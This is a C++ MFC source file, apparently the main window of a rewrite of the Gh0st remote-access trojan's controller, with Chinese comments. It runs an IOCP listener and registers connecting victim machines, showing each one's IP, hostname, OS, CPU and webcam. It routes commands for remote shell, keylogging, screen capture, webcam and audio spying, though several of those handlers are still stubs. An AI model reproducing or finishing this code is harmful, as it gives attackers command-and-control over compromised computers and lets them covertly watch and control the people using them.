
// UIDlg.cpp: 实现文件
//


#include "pch.h"
#include <WS2tcpip.h>
#include "framework.h"
#include "UI.h"
#include "UIDlg.h"
#include "afxdialogex.h"
#include "CSettingDlg.h"
#include "macros.h"
#include "Others/macros.h"
#include "Others/login.h"

//using namespace std;

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


CIOCPServer *g_iocpServer = nullptr;
CUIDlg		*g_UIDlg	  = nullptr;

// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CUIDlg 对话框
CUIDlg::CUIDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_UI_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	m_hMenu = nullptr;
	m_nWndWidth = NULL;
	ZeroMemory(&m_nifNotify, sizeof(m_nifNotify));
	g_iocpServer = new CIOCPServer;
	g_UIDlg = this;
}

CUIDlg::~CUIDlg()
{
	delete g_iocpServer;
}

// 加载UI
void CUIDlg::LoadUI()
{
	InitMainMenu();
	InitToolBar();
	InitOnlineListCtrl();
	InitEventLogListCtrl();
	InitStatusBar();
	InitNotify();
}

// 主菜单
void CUIDlg::InitMainMenu()
{
	m_hMenu = LoadMenu(nullptr, MAKEINTRESOURCE(IDR_MAIN_MENU));
	::SetMenu(this->GetSafeHwnd(), m_hMenu);
	::DrawMenuBar(this->GetSafeHwnd());
}

// 真彩色图标工具栏
void CUIDlg::InitToolBar()
{
	// create and load toobar
	DWORD dwStyle = WS_CHILD | WS_VISIBLE | CBRS_TOP | CBRS_GRIPPER |
					CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC;
	if (!m_tcTooBar.CreateEx(this, TBSTYLE_FLAT, dwStyle) ||
		!m_tcTooBar.LoadToolBar(IDR_TOOLBAR_MAIN)) {
		return;
	}

	m_tcTooBar.LoadTrueColorToolBar(UI_BTNWIDTH,
									IDB_BITMAP_MAIN_TOOLBAR,
									IDB_BITMAP_MAIN_TOOLBAR,
									IDB_BITMAP_MAIN_TOOLBAR);

	// get window size and set main toolbar size
	RECT rWnd, rToolBar;
	GetWindowRect(&rWnd);
	rToolBar.left   = rToolBar.top = NULL;
	rToolBar.bottom = UI_MAIN_TOOLBAR_BOTTOM;
	rToolBar.right  = rWnd.right - rWnd.left + UI_BTNWIDTH_OFFSET;
	m_tcTooBar.MoveWindow(&rToolBar);

	// set toolbar button text
	for (INT i = 0; i < UI_BUTTON_COUNT; ++i) {
		if (UI_BUTTON_NULL != i) {
			m_tcTooBar.SetButtonText(i, ButtonTextArray[i]);
		}
	}
	
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, FALSE);
}

// 在线主机列表
void CUIDlg::InitOnlineListCtrl()
{
	

	for (INT i = 0; i < UI_ONLINE_COLUMNS; ++i) {
		m_lcOnline.SetExtendedStyle(LVS_EX_FULLROWSELECT);
		m_lcOnline.InsertColumn(i,
								g_uiOnlineColumn[i].chTitle,
								LVCFMT_CENTER,
								g_uiOnlineColumn[i].nWidth);
	}



	// test
	//std::initializer_list<LPCTSTR> context = { "127.0.0.1", "本地1", "lenovo", 
	//										   "win10", "xen", "yes", "100M" };
	//AddContextListCtrol(m_lcOnline, context);
}


// 事件日志列表
void CUIDlg::InitEventLogListCtrl()
{
	m_lcEventLog.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	for (INT i = 0; i < UI_EVENTLOG_COLUMNS; ++i) {
		m_lcEventLog.InsertColumn(i,
								g_uiEventLogColumn[i].chTitle,
								LVCFMT_CENTER,
								g_uiEventLogColumn[i].nWidth);

		// 计算窗口的宽度，用于当窗口大小发生变化时，列的宽度也随这改变
		m_nWndWidth += g_uiEventLogColumn[i].nWidth;
	}

	// test
	//std::initializer_list<LPCTSTR> context = { "成功", "测试" };
	//AddContextListCtrol(m_lcEventLog, context);
}


// 添加内容到列表控件
void CUIDlg::AddContextListCtrol(CListCtrl &lc, std::initializer_list<LPCTSTR> context)
{
	UINT i = 1;

	for (auto ctx : context) {
		CString Begin = *(context.begin());
		if (ctx == Begin && lc == m_lcOnline) {
			lc.InsertItem(0, ctx);
			continue;
		}
		else if (ctx == Begin && lc == m_lcEventLog) {
			lc.InsertItem(0, GetSystemTime());
		}

		lc.SetItemText(0, i, ctx);
		++i;
	}
}

// 状态栏
void CUIDlg::InitStatusBar()
{
	UINT nIDCount = sizeof(g_nIndicators) / sizeof(UINT);
	if (!m_sbStatusBar.Create(this) ||
		!m_sbStatusBar.SetIndicators(g_nIndicators, nIDCount)) {
		return;
	}

	CRect r;
	::GetWindowRect(m_sbStatusBar.m_hWnd, r);
	m_sbStatusBar.MoveWindow(&r);
}


// 系统托盘显示
void CUIDlg::InitNotify()
{
	m_nifNotify.cbSize = sizeof(m_nifNotify);
	m_nifNotify.hWnd   = m_hWnd;
	m_nifNotify.uID = IDR_MAINFRAME;
	m_nifNotify.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;
	m_nifNotify.uCallbackMessage = UM_ICONNOTIFY;
	m_nifNotify.hIcon = m_hIcon;

	CString s = "Gh0st";
	if (!lstrcpyn(m_nifNotify.szTip, s, strlen(s))) {
		return;
	}

	Shell_NotifyIcon(NIM_ADD, &m_nifNotify);
}


// 获取系统时间
CString CUIDlg::GetSystemTime()
{
	CTime t = CTime::GetCurrentTime();

	return t.Format("%Y-%m-%d %H:%M:%S");
}


// 开始网络处理
void CUIDlg::StartNetwork()
{
	char szHostName[MAX_PATH] = { 0 }, 
		 szBuf[MAX_PATH]	  = { 0 },
		 szAddrList[MAX_PATH] = { 0 };
	ADDRINFOA AddrInfo, *Result = nullptr, *p = nullptr;
	SOCKADDR_IN *pAddr = nullptr;
	CString strEventLog;

	// 从ini配置文件读取端口、最大连接数
	CIniFile &IniFile   = ((CUIApp *)AfxGetApp())->m_iniFile;
	UINT nPort          = (UINT)IniFile.GetInt("Settings", "ListenPort");
	UINT nMaxConnection = (UINT)IniFile.GetInt("Settings", "MaxConnection");

	// 程序运行时，如果没有进行参数设置时，将参数设为默认值
	if (0 == nPort || 0 == nMaxConnection) {
		nPort			= DEFAULT_PORT;
		nMaxConnection	= DEFAULT_MAX_CONNECTION;
	}

	/*
	 * start iocp server
	 */
	if (g_iocpServer->Initialize(NotifyProc, NULL, 10000, nPort)) {
		gethostname(szHostName, sizeof(szHostName));

		ZeroMemory(&AddrInfo, sizeof(AddrInfo));
		AddrInfo.ai_family	 = AF_INET;
		AddrInfo.ai_socktype = SOCK_STREAM;
		AddrInfo.ai_protocol = IPPROTO_TCP;
		if (!getaddrinfo(szHostName, NULL, &AddrInfo, &Result)) {
			for (p = Result; p != nullptr; p = p->ai_next) {
				pAddr = (SOCKADDR_IN *)p->ai_addr;
				inet_ntop(AF_INET, &pAddr->sin_addr, szBuf, sizeof(szBuf));
				strncat_s(szAddrList, szBuf, sizeof(szBuf));

				if (p->ai_next) {
					strncat_s(szAddrList, " / ", 3);
				}
			}
		}

		strEventLog.Format("本机IP %s 端口 %d 最大连接数 %d", szAddrList, nPort, nMaxConnection);
		std::initializer_list<LPCTSTR> context = {"网络初始化", strEventLog};
		AddContextListCtrol(m_lcEventLog, context);
	} else {
		std::initializer_list<LPCTSTR> context = { "网络初始化失败" };
		AddContextListCtrol(m_lcEventLog, context);
	}


}


void CUIDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_ONLINE, m_lcOnline);
	DDX_Control(pDX, IDC_LIST_EVENT_LOG, m_lcEventLog);
}

BEGIN_MESSAGE_MAP(CUIDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()

	// 自定义消息处理
	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT(__thiscall CWnd:: *)(WPARAM, LPARAM)) &CUIDlg::OnIconNotify)
	ON_MESSAGE(WM_ADDONLINE, &CUIDlg::OnAddOnline)

	ON_COMMAND(ID_MAIN_SETTING, &CUIDlg::OnMainSetting)
	ON_COMMAND(ID_MIAN_CLOSE, &CUIDlg::OnMianClose)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_ONLINE, &CUIDlg::OnNMRClickListOnline)
END_MESSAGE_MAP()


// 网络连接事件通知处理回调函数
void CUIDlg::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
	try {
		switch (nCode) {
		case NC_CLIENT_CONNECT:
			// todo
			break;

		case NC_CLIENT_DISCONNECT:
			// todo
			break;

		case NC_TRANSMIT:
			// todo
			break;

		case NC_RECEIVE:
			// todo
			break;

		case NC_RECEIVE_COMPLETE:
			ProcessReceiveComplete(pContext);
			break;
		}
	}
	catch (...) {}


}


// 完全接收处理
void CUIDlg::ProcessReceiveComplete(ClientContext *pContext)
{
	if (!pContext) {
		return;
	}

	// 如果管理对话框打开，交给相应的对话框处理
	CDialog *dlg = (CDialog *)pContext->m_Dialog[1];      //这里就是ClientContext 结构体的int m_Dialog[2];

	//如果没有赋值就判断是否是上线包和打开功能功能窗口
	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0]) {
		// 要求验证
	case TOKEN_AUTH:
		//m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		break;

		// 回复心跳包
	case TOKEN_HEARTBEAT:
		/*BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
		m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));*/
		break;

		// 上线包
	case TOKEN_LOGIN:
	{
		//确定连接数是否到达上限
		UINT cnt = (UINT)g_UIDlg->m_lcOnline.GetItemCount();
		if (g_iocpServer->m_nMaxConnections <= cnt) {
			closesocket(pContext->m_Socket);
		} else {
			pContext->m_bIsMainSocket = true;
			/* 发送上线消息 */
			g_UIDlg->PostMessage(WM_ADDONLINE, 0, (LPARAM)pContext);
		}
		// 激活
		BYTE	bToken = COMMAND_ACTIVED;
		g_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		break;
	}

	case TOKEN_DRIVE_LIST: // 驱动器列表
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
		//g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;

	case TOKEN_BITMAPINFO: //
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
		//g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;

	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
		//g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;

	case TOKEN_AUDIO_START: // 语音
		//g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;

	case TOKEN_KEYBOARD_START:
		//g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;

	case TOKEN_PSLIST:
		//g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;

	case TOKEN_SHELL_START:
		//g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
		// 命令停止当前操作
	default:
		closesocket(pContext->m_Socket);
		break;
	}
}

BOOL CUIDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// 加载UI
	LoadUI();
	// 改变窗口的大小，触发窗口onsize()
	CRect r;
	GetWindowRect(&r);
	r.top += 1;
	MoveWindow(&r);

	// 开始网络处理
	StartNetwork();

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}


void CUIDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CUIDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}


//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CUIDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


// 指示窗口大小的更改
void CUIDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	CRect rOnSize;

	if (m_tcTooBar.m_hWnd) {
		rOnSize.top    = rOnSize.left = NULL;
		rOnSize.right  = cx;
		rOnSize.bottom = UI_MAIN_TOOLBAR_BOTTOM;

		m_tcTooBar.MoveWindow(&rOnSize);
	}

	if (m_lcOnline.m_hWnd) {
		rOnSize.left   = UI_ONLINE_LEFT;
		rOnSize.top    = UI_ONLINE_TOP;
		rOnSize.right  = cx - UI_ONLINE_RIGHT;
		rOnSize.bottom = cy - UI_ONLINE_BOTTOM;

		m_lcOnline.MoveWindow(&rOnSize);

		// 按原来的比例缩放列表的宽度
		for (INT i = 0; i < UI_ONLINE_COLUMNS; ++i) {
			DOUBLE w = g_uiOnlineColumn[i].nWidth;
			w /= m_nWndWidth;
			w *= cx;
			m_lcOnline.SetColumnWidth(i, (int)w);
		}
	}

	if (m_lcEventLog.m_hWnd) {
		rOnSize.left   = UI_EVENTLOG_LEFT;
		rOnSize.top    = cy - UI_EVENTLOG_TOP;
		rOnSize.right  = cx - UI_EVENTLOG_RIGHT;
		rOnSize.bottom = cy - UI_EVENTLOG_BOTTOM;

		m_lcEventLog.MoveWindow(&rOnSize);

		// 按原来的比例缩放列表的宽度
		for (INT i = 0; i < UI_EVENTLOG_COLUMNS; ++i) {
			DOUBLE w = g_uiEventLogColumn[i].nWidth;
			w /= m_nWndWidth;
			w *= cx;
			m_lcEventLog.SetColumnWidth(i, (int)w);
		}
	}

	if (m_sbStatusBar.m_hWnd) {
		rOnSize.top    = cy - UI_STATUSBAR_TOP;
		rOnSize.right  = cx;
		rOnSize.left   = NULL;
		rOnSize.bottom = cy;

		m_sbStatusBar.MoveWindow(&rOnSize);
		m_sbStatusBar.SetPaneInfo(0,
								m_sbStatusBar.GetItemID(0),
								SBPS_POPOUT,
								cx - UI_STATUSBAR_OFFSET);
	}
}


// 系统托盘消息处理
void CUIDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)
{
	switch ((UINT)lParam)
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONDBLCLK:
		if (!IsWindowVisible()) {
			ShowWindow(SW_SHOW);
		} else {
			ShowWindow(SW_HIDE);
		}
		break;

	case WM_RBUTTONDOWN:
	{
		CMenu mNotify;
		CPoint p;

		mNotify.LoadMenu(IDR_MENU_NOTIFY);
		GetCursorPos(&p);
		SetForegroundWindow();
		mNotify.GetSubMenu(0)->TrackPopupMenu(TPM_LEFTBUTTON|TPM_RIGHTBUTTON,
												p.x, p.y,this, NULL);
		PostMessage(WM_USER);
		break;
	}

	default:
		break;
	}
}


// 上线后将主机信息显示在上线列表
LRESULT CUIDlg::OnAddOnline(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	if (!pContext) {
		return -1;
	}


	try {
		//int nCnt = m_pListCtrl->GetItemCount();

		// 不合法的数据包
		//if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO)) {
		//	return -1;
		//}

		// 获取登陆主机的信息
		LOGININFO *LoginInfo = (LOGININFO *)pContext->m_DeCompressionBuffer.GetBuffer();


		// 填充上线主机列表
		// 0 IP
		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket, (SOCKADDR *)&sockAddr, &nSockAddrLen);
		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
		// 1 区域
		// 2 计算机名
		CString strPCName = LoginInfo->HostName;
		// 3 操作系统
		char *pszOS = NULL;
		switch (LoginInfo->OsVerInfoEx.dwPlatformId) {
		case VER_PLATFORM_WIN32_NT:
			if (LoginInfo->OsVerInfoEx.dwMajorVersion <= 4) {
				pszOS = "NT";
			}

			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0) {
				pszOS = "2000";
			}

			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1) {
				pszOS = "XP";
			}

			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2) {
				pszOS = "2003";
			}

			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0) {
				pszOS = "Vista";  // Just Joking
			}
		}
		CString strOS;
		strOS.Format("%s SP%d (Build %d)", /*OsVerInfo.szCSDVersion,*/ pszOS,
					LoginInfo->OsVerInfoEx.wServicePackMajor,
					LoginInfo->OsVerInfoEx.dwBuildNumber);
		// 4 CPU
		CString strCPU;
		strCPU.Format("%dMHz", LoginInfo->CPUClockMhz);
		// 5 摄像头
		CString strVideo;
		strVideo = LoginInfo->bIsWebCam ? "有" : "--";
		// 6 PING
		CString strPing;
		strPing.Format("%lld", LoginInfo->dwSpeed);


		//CString	strToolTipsText;
		//strToolTipsText.Format("New Connection Information:\nHost: %s\nIP  : %s\nOS  : Windows %s", LoginInfo->HostName, IPAddress, strOS);

		//if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)
		//{

		//	str = m_QQwry->IPtoAdd(IPAddress);
		//	m_pListCtrl->SetItemText(i, 8, str);

		//	strToolTipsText += "\nArea: ";
		//	strToolTipsText += str;
		//}
		// 指定唯一标识
		//m_pListCtrl->SetItemData(i, (DWORD)pContext);    //这里将服务端的套接字等信息加入列表中保存

		//g_pFrame->ShowConnectionsNumber();

		//if (!((CGh0stApp *)AfxGetApp())->m_bIsDisablePopTips)
		//	g_pFrame->ShowToolTips(strToolTipsText);

		std::initializer_list<LPCTSTR> context = { IPAddress, "本地", strPCName,
											   strOS, strCPU, strVideo, strPing };
		AddContextListCtrol(m_lcOnline, context);

		context = {"加载DLL", "server dll is loaded success"};
		AddContextListCtrol(m_lcEventLog, context);
	} catch (...) {}

	return 0;
}


// 参数设置
void CUIDlg::OnMainSetting()
{
	CSettingDlg dlg;
	dlg.DoModal();
}


// 退出
void CUIDlg::OnMianClose()
{
	PostMessage(WM_CLOSE);
}


// 用户在控件online内单击鼠标右键
void CUIDlg::OnNMRClickListOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	
	CMenu popup, *pSub;
	CPoint p;

	popup.LoadMenu(IDR_MENU_LBUTTON);
	pSub = popup.GetSubMenu(0);
	GetCursorPos(&p);
	UINT nSubCount = pSub->GetMenuItemCount();

	// 没有列被选中时菜单显示灰色并不可用
	if (m_lcOnline.GetSelectedCount() == NULL) {
		for (UINT i = 0; i < nSubCount; ++i) {
			pSub->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
		}
	}
	pSub->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);

	*pResult = 0;
}
